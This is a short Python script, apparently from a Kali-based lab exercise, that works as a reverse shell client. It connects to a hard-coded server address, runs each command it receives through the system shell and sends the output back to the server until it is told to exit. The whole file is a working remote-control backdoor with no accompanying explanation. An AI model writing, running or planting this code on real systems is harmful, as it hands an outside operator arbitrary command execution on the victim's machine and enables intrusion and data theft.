#Client VM: Kali 4001
#Clients IP: 192.168.204.209
#Port: 4444

import socket
import subprocess

#HOST = input("Enter the Server's IP Address: ")
#PORT = input("Enter the port used by the server: ")

# The server's hostname or IP address
HOST = "192.168.193.113"
PORT = 65432  # The port used by the server

def run_cmd(cmd):
    try:
        completed = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT, timeout=60)
        return completed.stdout
    except Exception as e:
        return str(e).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    print("Connected to server")
    buffer = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            print("Server closed connection")
            break
        buffer += chunk
        if b"\n" in buffer:
            line, _, buffer = buffer.partition(b"\n")
            cmd = line.decode().strip()
            if cmd.lower() == "exit":
                print("Exit received")
                break
            output = run_cmd(cmd)
            s.sendall(output + b"\n--END--\n")
